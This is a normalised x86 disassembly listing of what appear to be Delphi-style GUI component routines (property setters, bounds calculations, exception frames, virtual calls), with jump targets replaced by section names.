mov edx [ esi + 0xc ]
sub edx [ ebx + 0x218 ]
sub edx eax
push edx
lea eax [ esp + 0x10 ]
push eax
push 0x64
mov eax [ esp + 0x10 ]
push eax
mov edx 0x2
mov eax ebx
call sub_477d20
push eax
call sub_4062e4
mov edx [ esi + 0x8 ]
sub edx [ ebx + 0x218 ]
sub edx eax
push edx
push 0x64
mov eax [ esp + 0x18 ]
push eax
mov edx 0x1
mov eax ebx
call sub_477d20
push eax
call sub_4062e4
mov edx [ esi + 0x4 ]
add edx [ ebx + 0x218 ]
add eax edx
push eax
push 0x64
mov eax [ esp + 0x18 ]
push eax
xor edx edx
mov eax ebx
call sub_477d20
push eax
call sub_4062e4
mov edx [ esi ]
add edx [ ebx + 0x218 ]
add eax edx
pop edx
pop ecx
call sub_412f04
push edi
lea esi [ esp + 0x10 ]
lea edi [ ebx + 0x28e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax ebx
call sub_477d94
lea edx [ ebx + 0x22d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax [ esp ]
push eax
mov ecx [ ebx + 0x250 ]
mov edx edi
mov eax [ ebx + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0xb4 ]
add esp 0x1c
pop edi
pop esi
pop ebx
retn
sub_4778e0
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x270 ] 0x0
jne r-xdata
add esp 0x10
pop ebx
retn
mov eax [ ebx + 0x288 ]
mov edx [ eax ]
call [ edx + 0xb8 ]
test al al
jne r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov ecx esp
mov edx [ ebx + 0x250 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_477924
push ebp
mov ebp esp
push ebx
push esi
mov ebx ecx
mov esi [ eax + 0x288 ]
test bl bl
je r-xdata
mov eax [ esi + 0x10 ]
call sub_41d9c8
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov dl 0x2
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
call sub_41cd14
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
sete al
and eax 0x7f
mov edx [ eax * 4 + rw-data ]
mov eax [ esi + 0x10 ]
call sub_41d9c8
jmp r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41dae4
mov eax [ esi + 0x10 ]
call sub_41d9fc
test bl bl
jne r-xdata
sub_4779bc
push ebx
mov ebx eax
mov eax [ ebx + 0x288 ]
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x270 ] 0x0
jne r-xdata
cmp [ ebx + 0x270 ] 0x0
je r-xdata
mov eax [ ebx + 0x288 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebx + 0x288 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
sub_477a18
push ebp
mov ebp esp
add esp 0xffffffec
xor ecx ecx
mov [ ebp - 0x14 ] ecx
xor ecx ecx
push ebp
push sub_477a9d
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp edx 0x1
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x64
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
jmp r-xdata
cmp edx 0x64
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477aa4
lea eax [ ebp - 0x14 ]
call sub_404094
retn
lea ecx [ eax + 0x228 ]
xchg edx ecx
call sub_477b34
sub_477abc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax [ ebx ]
mov edx edi
call sub_4044a0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx edi
call sub_4040e8
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_477ae4
push ebp
mov ebp esp
push esi
mov esi eax
fld [ edx ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
pop esi
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_477b60
push ebx
push esi
mov esi edx
mov ebx eax
mov dx [ ebx + 0x268 ]
mov eax ebx
call sub_44275c
mov eax [ ebx + 0x26c ]
mov [ eax + 0x4 ] 0x0
mov edx esi
mov eax ebx
call sub_4442e0
pop esi
pop ebx
retn
sub_477bb8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x28c ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x288 ]
test esi esi
je r-xdata
mov eax ebx
call sub_448bb8
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_477be4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_404544
xor eax eax
push ebp
push sub_477d10
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov dl [ rw-data ]
call sub_40427c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404698
mov ebx eax
test ebx ebx
jne r-xdata
xor esi esi
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov esi eax
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_4045b4
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx eax
mov eax esi
call sub_4772a0
mov esi eax
mov eax [ ebp - 0xc ]
inc [ eax ]
lea eax [ ebp - 0x8 ]
mov ecx ebx
mov edx 0x1
call sub_4045f4
lea eax [ ebp - 0x18 ]
mov dl [ rw-data ]
call sub_40427c
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404698
mov ebx eax
test ebx ebx
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477d17
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_4040b8
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx eax
mov eax esi
call sub_4772a0
mov esi eax
mov eax [ ebp - 0xc ]
inc [ eax ]
sub_477d20
add eax 0x258
sub edx 0x1
jb r-xdata
mov eax [ eax ]
retn
je r-xdata
mov eax [ eax + 0x4 ]
retn
dec edx
je r-xdata
mov eax [ eax + 0x8 ]
retn
jmp r-xdata
mov eax [ eax + 0xc ]
retn
sub_477d40
push esi
lea esi [ eax + 0x258 ]
sub edx 0x1
jb r-xdata
mov edx esi
call sub_477b34
pop esi
retn
je r-xdata
lea edx [ esi + 0x4 ]
call sub_477b34
pop esi
retn
dec edx
je r-xdata
lea edx [ esi + 0x8 ]
call sub_477b34
pop esi
retn
jmp r-xdata
lea edx [ esi + 0xc ]
call sub_477b34
pop esi
retn
sub_477d94
push esi
lea edx [ eax + 0x28e ]
mov ecx [ eax + 0x22d ]
cmp ecx [ edx ]
jle r-xdata
mov ecx [ eax + 0x231 ]
cmp ecx [ edx + 0x4 ]
jle r-xdata
mov [ edx ] ecx
mov ecx [ edx ]
mov esi [ edx + 0x8 ]
cmp ecx esi
jle r-xdata
mov [ edx + 0x4 ] ecx
cmp ecx esi
jne r-xdata
inc ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov esi [ edx + 0xc ]
cmp ecx esi
jle r-xdata
add ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
cmp ecx esi
jne r-xdata
inc ecx
mov [ edx + 0xc ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x240 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x244 ] ecx
mov ecx [ edx ]
add ecx [ edx + 0x8 ]
sar ecx 0x1
jns r-xdata
add ecx [ eax + 0x4c ]
mov [ edx + 0xc ] ecx
mov [ eax + 0x248 ] ecx
mov ecx [ edx + 0x4 ]
add ecx [ edx + 0xc ]
sar ecx 0x1
jns r-xdata
adc ecx 0x0
mov [ eax + 0x24c ] ecx
pop esi
retn
adc ecx 0x0
sub_477e28
push ebx
push esi
push edi
mov esi eax
mov edi [ esi + 0x288 ]
mov ebx [ edi + 0xc ]
mov eax [ esi + 0x70 ]
call sub_41cd14
mov edx eax
mov eax ebx
call sub_41d6c0
mov eax ebx
call sub_41d6b8
cmp eax 0xffffff
jne r-xdata
mov dl 0xf
mov eax ebx
call sub_41d7a0
xor edx edx
mov eax ebx
call sub_41d7bc
mov edx 0x1
mov eax ebx
call sub_41d7ec
mov eax [ edi + 0x10 ]
mov dl 0x1
call sub_41dae4
mov eax [ esi + 0x284 ]
mov edx [ eax + 0x10 ]
push edx
mov edx [ eax + 0x14 ]
push edx
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41d6c0
sub_477ed4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4149b4
mov edi esi
mov eax edi
call sub_477d7c
mov edx eax
mov eax ebx
call sub_477d88
mov al [ edi + 0x271 ]
mov [ ebx + 0x271 ] al
mov eax [ edi + 0x274 ]
mov [ ebx + 0x274 ] eax
push esi
push edi
lea esi [ edi + 0x258 ]
lea edi [ ebx + 0x258 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax edi
call sub_477ebc
mov edx eax
mov eax ebx
call sub_477ec8
mov al [ edi + 0x278 ]
mov [ ebx + 0x278 ] al
mov edx [ edi + 0x27c ]
mov eax [ ebx + 0x27c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x228 ]
mov [ ebx + 0x228 ] eax
mov edx [ edi + 0x70 ]
mov eax ebx
call sub_4426f0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_477f80
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x270 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41d7b4
test al al
je r-xdata
mov eax ebx
call sub_41d7e4
dec eax
jne r-xdata
xor edx edx
mov eax ebx
call sub_41d7ec
sub_477fb0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
cmp [ ebx + 0x270 ] 0x0
je r-xdata
mov eax [ ebx + 0x288 ]
mov esi [ eax + 0xc ]
xor edx edx
mov eax esi
call sub_41d7bc
mov edx 0x1
mov eax esi
call sub_41d7ec
mov dl 0x4
mov eax esi
call sub_41d7a0
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x10 ]
mov dl 0x1
call sub_41dae4
mov al [ ebx + 0x212 ]
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ esp + 0x8 ]
mov ecx [ ebx + 0x288 ]
mov ecx [ ecx + 0x4 ]
xchg ecx eax
call sub_42e010
mov al [ ebx + 0x211 ]
test al al
je r-xdata
cmp al 0x2
sete dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
push edx
mov edx [ ebx + 0x214 ]
push edx
cmp al 0x1
sete al
and eax 0x7f
mov ecx [ eax * 4 + rw-data ]
lea edx [ esp + 0x8 ]
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x4 ]
call sub_42e010
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp al 0x2
sete dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
push edx
mov edx [ ebx + 0x214 ]
push edx
cmp al 0x1
sete al
and eax 0x7f
mov ecx [ eax * 4 + rw-data ]
lea edx [ esp + 0x8 ]
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x4 ]
call sub_42e010
sub_478104
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_47757c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_478668
mov [ ebx + 0x2c0 ] eax
mov [ ebx + 0x2bc ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202a4
mov esi eax
mov [ ebx + 0x2b8 ] esi
mov [ esi + 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0xd0 ]
mov [ esi + 0x10 ] eax
mov [ ebx + 0x2b0 ] 0x8
mov [ ebx + 0x2b5 ] 0x1
mov [ ebx + 0x2b6 ] 0x3
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_478198
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x2c0 ]
call sub_403344
mov eax [ esi + 0x2b8 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_477704
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4781d4
push ebx
mov ebx eax
cmp [ ebx + 0x2da ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebx + 0x2c4 ] 0x0
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
sub_47820c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_477ed4
pop edi
pop esi
pop ebx
retn
mov edi esi
mov edx [ edi + 0x2b8 ]
mov eax [ ebx + 0x2b8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x2bc ]
mov [ ebx + 0x2bc ] al
mov edx [ edi + 0x2c0 ]
mov eax [ ebx + 0x2c0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x2b6 ]
mov [ ebx + 0x2b6 ] al
mov al [ edi + 0x2b5 ]
mov [ ebx + 0x2b5 ] al
mov al [ edi + 0x2b4 ]
mov [ ebx + 0x2b4 ] al
mov eax [ edi + 0x2b0 ]
mov [ ebx + 0x2b0 ] eax
sub_478294
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov esi [ ebx + 0x2b8 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edi eax
sub_4782d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2b8 ]
call sub_4209c4
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2b8 ]
call sub_4209dc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
jge r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
jge r-xdata
add esi [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2b8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x18 ]
add ecx esi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
add edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov edi [ eax ]
call [ edi + 0x34 ]
add ebx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
jl r-xdata
sub_478370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xffffffe4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov esi [ eax ]
call [ esi + 0xa4 ]
mov eax [ ebp - 0x8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov esi [ eax ]
call [ esi + 0xa4 ]
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x278 ] 0x0
jne r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc [ ebx + 0x4 ]
sub_4783f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2bc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4779bc
mov ebx eax
test bl bl
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
mov ecx [ eax + 0xc ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
jmp r-xdata
push ebp
call sub_478370
pop ecx
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x1c ]
call sub_4729f8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2bc ] 0x1
jne r-xdata
push ebp
call sub_478370
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
xor ecx ecx
mov esi [ eax ]
call [ esi + 0xc0 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
call sub_4209dc
mov edx [ ebp - 0x8 ]
sub edx eax
sar edx 0x1
jns r-xdata
push ebp
call sub_4782d0
pop ecx
jmp r-xdata
add edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
call sub_4209c4
mov edx [ ebp - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
test bl bl
je r-xdata
add edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x34 ]
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x90 ]
sub_478590
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esi
mov esi edx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov eax [ esi + 0x288 ]
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
retn
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_4785e0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov esi [ edi + 0x2c0 ]
cmp [ esi + 0x14 ] 0x0
je r-xdata
cmp [ edi + 0x270 ] 0x0
je r-xdata
mov al [ esi + 0x4 ]
test al al
je r-xdata
mov ebx [ edi + 0x288 ]
mov eax [ ebx + 0x10 ]
mov edx [ edi + 0x70 ]
call sub_41d9c8
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_41dae4
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ esi + 0x8 ]
push edx
push eax
mov edx ebp
mov ecx [ esi + 0x10 ]
mov eax [ edi + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
jmp r-xdata
cmp al 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x10 ]
push edx
push eax
mov edx ebp
mov ecx [ esi + 0x8 ]
mov eax [ edi + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
jmp r-xdata
sub_478668
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0xc ] esi
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x10 ] 0xffffff
mov [ edi + 0x8 ] 0xffff
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4786b8
push esi
push edi
mov esi eax
cmp dl [ esi + 0x14 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x14 ] dl
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4786d8
push esi
push edi
mov esi eax
cmp dl [ esi + 0x4 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x4 ] dl
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4786f8
push esi
push edi
mov esi eax
cmp edx [ esi + 0x10 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x10 ] edx
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_478718
push esi
push edi
mov esi eax
cmp edx [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x8 ] edx
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_478738
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4149b4
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x14 ]
mov [ ebx + 0x14 ] dl
mov dl [ eax + 0x4 ]
mov [ ebx + 0x4 ] dl
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov eax [ eax + 0x8 ]
mov [ ebx + 0x8 ] eax
pop esi
pop ebx
retn
sub_478778
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403314
mov esi edi
mov [ ebx + 0x4 ] esi
push esi
mov eax [ esi ]
mov eax [ eax + 0xd0 ]
push eax
call sub_47745c
mov [ ebx + 0x8 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4787e4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_478814
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4149b4
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_478868
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0x10 ]
jle r-xdata
mov eax [ ebx + 0xc ]
cmp eax [ ebx + 0x14 ]
jle r-xdata
lea edx [ ebx + 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_4772a8
pop ebx
retn
lea edx [ ebx + 0x14 ]
lea eax [ ebx + 0xc ]
call sub_4772a8
sub_4788e4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax esi
call j_sub_404560#2
mov dl [ rw-data ]
mov [ eax + ebx - 0x1 ] dl
mov edx [ esi ]
mov eax edi
call sub_40c998
mov ebx eax
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
sub_478914
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404544
xor eax eax
push ebp
push sub_4789a6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov dl [ rw-data ]
call sub_40427c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40c998
test eax eax
jle r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc ebx
lea edx [ ebp - 0x4 ]
mov ecx eax
mov eax 0x1
xchg edx eax
call sub_4045f4
lea eax [ ebp - 0xc ]
mov dl [ rw-data ]
call sub_40427c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40c998
test eax eax
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4789ad
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4040b8
retn
